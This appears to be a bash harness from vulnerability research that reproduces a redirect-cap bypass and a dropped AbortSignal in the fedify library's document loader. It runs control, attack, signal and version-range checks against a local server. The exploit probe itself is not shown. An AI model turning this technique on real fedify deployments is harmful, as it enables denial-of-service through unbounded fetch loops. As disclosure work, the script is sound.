#!/usr/bin/env bash
# fedify Lead 0001 — getRemoteDocument()'s alternate-document hop re-enters the
# loader through a bare one-argument call, resetting the redirect cap and the
# visited-URL set that GHSA-gm9m-gwc4-hwgp / CVE-2026-34148 added, and dropping
# the caller's AbortSignal.
#
#   ./lab.sh up          install the pinned PUBLISHED npm artifacts; assert they
#                        match the git tag byte for byte
#   ./lab.sh control     302 chain — the documented cap must FIRE
#   ./lab.sh attack      both alternate-document hops — the cap must NOT fire
#   ./lab.sh signal      the caller's AbortSignal is dropped
#   ./lab.sh range       re-run the finding against every published line tip
#   ./lab.sh repeat [N]  N consecutive reproductions (default 3)
#   ./lab.sh down        stop anything listening, clear run state
#   ./lab.sh all         up -> control -> attack -> signal -> repeat 3 -> down
#   ./lab.sh full        all, plus range (slower: six npm installs)
#
# The target is a LIBRARY, so there is no server to stand up and no UI to
# screenshot. The lab is the published artifact plus a local HTTP server on
# 127.0.0.1 that answers with the two-node cycle. Nothing leaves this host.
set -uo pipefail

PIN=2.3.8
PIN_SHA=12119e5c4772c757804e18e9d80401163ccc2bc0

LAB=${LAB:-./lab}
REPO=${REPO:-./repo}
OUT=$LAB/run-artifacts
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# From `bun Lab.ts evidence fedify 0001`. B marks the attacker-controlled host,
# which is every URL the loader is induced to fetch.
MARK=${MARK:-CVEHUNT-0001-9CAC98CC-B}

die()   { printf '\n!! FAIL: %s\n' "$*" >&2; exit 1; }
ok()    { printf '   ok   %s\n' "$*"; }
head_() { printf '\n== %s ==\n' "$*"; }

# Read one field out of the probe's single JSON line.
jget() { python3 -c '
import json,sys
try: d=json.loads(sys.stdin.read().strip().splitlines()[-1])
except Exception: print("PARSE-ERROR"); sys.exit(0)
v=d.get(sys.argv[1]); print(json.dumps(v) if isinstance(v,(dict,list)) else v)
' "$1"; }

probe() {  # probe <mode> <port> [extra env assignments...]
  local mode=$1 port=$2; shift 2
  ( cd "$LAB" && env MARK="$MARK" PORT="$port" "$@" timeout 180 node probe.mjs "$mode" )
}

# ---------------------------------------------------------------- up

cmd_up() {
  head_ "up — the published artifacts at $PIN, and proof they are the pinned source"
  mkdir -p "$OUT" || die "cannot create $OUT"
  command -v node >/dev/null || die "node is not installed"
  command -v npm  >/dev/null || die "npm is not installed"

  [ -f "$LAB/probe.mjs" ] || {
    [ -f "$HERE/lab/probe.mjs" ] || die "no probe.mjs beside lab.sh ($HERE/lab/probe.mjs)"
    cp "$HERE/lab/probe.mjs" "$LAB/probe.mjs" || die "cannot seed probe.mjs"
    ok "seeded probe.mjs from $HERE/lab"
  }

  [ -f "$LAB/package.json" ] || printf '%s\n' \
    '{ "name": "cvehunt-fedify-lab", "private": true, "type": "module" }' > "$LAB/package.json"

  ( cd "$LAB" && npm install --no-audit --no-fund --silent \
      "@fedify/vocab-runtime@$PIN" "@fedify/fedify@$PIN" ) || die "npm install failed"

  for p in @fedify/vocab-runtime @fedify/fedify; do
    v=$(node -e "console.log(require('$LAB/node_modules/$p/package.json').version)" 2>/dev/null)
    [ "$v" = "$PIN" ] || die "$p installed as $v, expected $PIN"
  done
  ok "installed @fedify/vocab-runtime@$PIN and @fedify/fedify@$PIN"

  # Gate 1a. For an npm target the "image vs tag" question is "does the published
  # tarball carry the source that was read at the tag". fedify ships src/ inside
  # the package, so this is answerable exactly rather than by inference — and the
  # answer must be recorded, because a runtime result against a republished
  # tarball may apply to no git tag at all.
  [ -d "$REPO" ] || die "no pinned clone at $REPO — run: bun Lab.ts provision fedify --ref $PIN"
  got_sha=$(git -C "$REPO" rev-parse HEAD 2>/dev/null)
  [ "$got_sha" = "$PIN_SHA" ] || die "clone is at $got_sha, expected $PIN_SHA ($PIN)"
  for f in docloader.ts url.ts; do
    a="$REPO/packages/vocab-runtime/src/$f"
    b="$LAB/node_modules/@fedify/vocab-runtime/src/$f"
    [ -f "$a" ] || die "missing $a"
    [ -f "$b" ] || die "the published tarball does not ship src/$f — Gate 1a cannot be closed this way"
    cmp -s "$a" "$b" || die "PUBLISHED $f DIFFERS FROM THE TAG — reconcile before trusting any runtime result"
    ok "src/$f in the npm tarball is byte-identical to tag $PIN  (sha256 $(sha256sum "$a" | cut -c1-16))"
  done

  # And the defect is present in the COMPILED bundle, not only in the shipped
  # source, so it is what actually executes.
  grep -q 'return await fetch(altUri.href)' "$LAB/node_modules/@fedify/vocab-runtime/dist/mod.js" \
    || die "the compiled bundle does not contain the cited call — the artifact is not what was read"
  ok "the one-argument call is present in dist/mod.js, i.e. in the code that runs"
}

# ---------------------------------------------------------------- control

cmd_control() {
  head_ "control — an ordinary 302 chain. The documented cap MUST fire."
  out=$(probe control 45871) || die "control probe did not run"
  echo "$out" > "$OUT/control.json"
  served=$(printf '%s' "$out" | jget requestsServed)
  held=$(printf '%s' "$out" | jget boundHeld)
  err=$(printf '%s' "$out" | jget error)
  [ "$held" = "True" ] || die "control: the cap did NOT hold ($served requests) — broken environment, not a finding"
  [ "$served" = "3" ] || die "control: expected 3 requests (maxRedirection 2 + the first), got $served"
  case "$err" in *"Too many redirections"*) : ;; *) die "control: expected a redirection-cap error, got: $err" ;; esac
  ok "control: $served requests, then $err"
  ok "the bound works on the hop CVE-2026-34148 patched"
}

# ---------------------------------------------------------------- attack

cmd_attack() {
  head_ "attack — the two alternate-document hops. Same loader, same maxRedirection."
  local port=45872
  for mode in header html; do
    out=$(probe "$mode" "$port") || die "$mode probe did not run"
    echo "$out" > "$OUT/attack-$mode.json"
    served=$(printf '%s' "$out" | jget requestsServed)
    held=$(printf '%s' "$out" | jget boundHeld)
    outcome=$(printf '%s' "$out" | jget outcome)
    paths=$(printf '%s' "$out" | jget firstPathsServed)
    [ "$held" = "False" ] \
      || die "$mode: the cap HELD at $served requests — the finding does not reproduce on this path"
    [ "$served" -ge 60 ] \
      || die "$mode: only $served requests; the run stopped for some reason other than our own limit"
    [ "$outcome" = "RESOLVED" ] \
      || die "$mode: expected the loader to resolve at our stop-server, got $outcome"
    ok "$mode: $served requests served — and 60 is OUR stop-after, not a bound the loader imposed"
    ok "$mode: cycle seen at the server: $paths"
    port=$((port + 1))
  done
  ok "same loader, same maxRedirection: 2, only the hop kind changed"
}

# ---------------------------------------------------------------- signal

cmd_signal() {
  head_ "signal — the caller's AbortSignal is discarded along with the options"
  out=$(probe signal 45874 STOP_AFTER=100000) || die "signal probe did not run"
  echo "$out" > "$OUT/signal.json"
  outcome=$(printf '%s' "$out" | jget outcome)
  served=$(printf '%s' "$out" | jget requestsServed)
  after=$(printf '%s' "$out" | jget stillRunningMsAfterAbort)
  rps=$(printf '%s' "$out" | jget requestsPerSecond)
  [ "$outcome" = "HARNESS-GAVE-UP" ] \
    || die "signal: the loader stopped on its own ($outcome) — the AbortSignal may be honoured after all"
  [ "$after" -gt 1000 ] || die "signal: only ${after}ms elapsed after the abort; inconclusive"
  ok "aborted after 1500ms; still running ${after}ms later, $served requests at ~${rps}/s"
  ok "options (hence options.signal) are dropped by the one-argument re-entry"
}

# ---------------------------------------------------------------- range

cmd_range() {
  head_ "range — every published line tip, each in its own tree"
  : > "$OUT/range.txt"
  # pkg:version pairs. 2.x lives in @fedify/vocab-runtime; the 1.x lines predate
  # the split and export getDocumentLoader from @fedify/fedify itself.
  local rows="@fedify/vocab-runtime:2.3.8 @fedify/vocab-runtime:2.2.13 @fedify/vocab-runtime:2.1.24 @fedify/vocab-runtime:2.0.28 @fedify/fedify:1.10.11 @fedify/fedify:1.9.12"
  local port=45880
  for row in $rows; do
    pkg=${row%:*}; ver=${row#*:}
    d="$LAB/range/${pkg#@fedify/}-$ver"
    mkdir -p "$d"
    printf '%s\n' '{ "name": "cvehunt-range", "private": true, "type": "module" }' > "$d/package.json"
    ( cd "$d" && npm install --no-audit --no-fund --silent "$pkg@$ver" ) \
      || { printf '%-28s %-9s INSTALL-FAILED\n' "$pkg" "$ver" >> "$OUT/range.txt"; port=$((port+1)); continue; }
    got=$(node -e "console.log(require('$d/node_modules/$pkg/package.json').version)" 2>/dev/null)
    [ "$got" = "$ver" ] || die "range: $pkg installed as $got, expected $ver"
    # The 1.x trees export the loader from @fedify/fedify; rewrite the import.
    sed "s|from \"@fedify/vocab-runtime\"|from \"$pkg\"|" "$LAB/probe.mjs" > "$d/probe.mjs"
    out=$( cd "$d" && env MARK="$MARK" PORT="$port" timeout 180 node probe.mjs html 2>&1 | tail -1 )
    served=$(printf '%s' "$out" | jget requestsServed)
    held=$(printf '%s' "$out" | jget boundHeld)
    case "$held" in
      False) verdict="UNBOUNDED  ($served requests, our stop)" ;;
      True)  verdict="BOUNDED    ($served requests) <-- NOT AFFECTED" ;;
      *)     verdict="ERROR: $out" ;;
    esac
    printf '%-28s %-9s %s\n' "$pkg" "$ver" "$verdict" | tee -a "$OUT/range.txt"
    port=$((port + 1))
  done
  ok "range table written to $OUT/range.txt"
}

# ---------------------------------------------------------------- repeat

cmd_repeat() {
  n=${1:-3}
  head_ "repeat — $n consecutive reproductions, fresh process and fresh port each time"
  : > "$OUT/repeat.log"
  local port=45890
  for i in $(seq "$n"); do
    out=$(probe html "$port") || die "reproduction $i did not run"
    served=$(printf '%s' "$out" | jget requestsServed)
    held=$(printf '%s' "$out" | jget boundHeld)
    [ "$held" = "False" ] || die "reproduction $i: the cap held at $served requests"
    {
      echo "--- reproduction $i/$n ---"
      echo "mode        : html (<link rel=\"alternate\" type=\"application/activity+json\">)"
      echo "loader      : getDocumentLoader({ allowPrivateAddress: true, maxRedirection: 2 })"
      echo "port        : $port   (fresh process, fresh server, fresh loader)"
      echo "probe output: $out"
    } >> "$OUT/repeat.log"
    ok "reproduction $i/$n -> $served requests, bound did not hold"
    port=$((port + 1))
  done
  ok "$n/$n reproductions, deterministic. transcript: $OUT/repeat.log"
}

# ---------------------------------------------------------------- down

cmd_down() {
  head_ "down"
  # Every probe binds, serves and exits; nothing is left listening. Assert it.
  for p in 45871 45872 45873 45874; do
    if command -v ss >/dev/null && ss -ltn 2>/dev/null | grep -q "127.0.0.1:$p "; then
      die "something is still listening on 127.0.0.1:$p"
    fi
  done
  ok "no probe listener left bound"
  ok "node_modules kept — it IS the pinned environment, and re-installing costs a network round trip"
}

case "${1:-all}" in
  up) cmd_up ;;
  control) cmd_control ;;
  attack) cmd_attack ;;
  signal) cmd_signal ;;
  range) cmd_range ;;
  repeat) cmd_repeat "${2:-3}" ;;
  down) cmd_down ;;
  all)  cmd_up && cmd_control && cmd_attack && cmd_signal && cmd_repeat 3 && cmd_down
        printf '\n== all phases passed ==\n' ;;
  full) cmd_up && cmd_control && cmd_attack && cmd_signal && cmd_range && cmd_repeat 3 && cmd_down
        printf '\n== all phases passed (including range) ==\n' ;;
  *) die "unknown subcommand: $1" ;;
esac
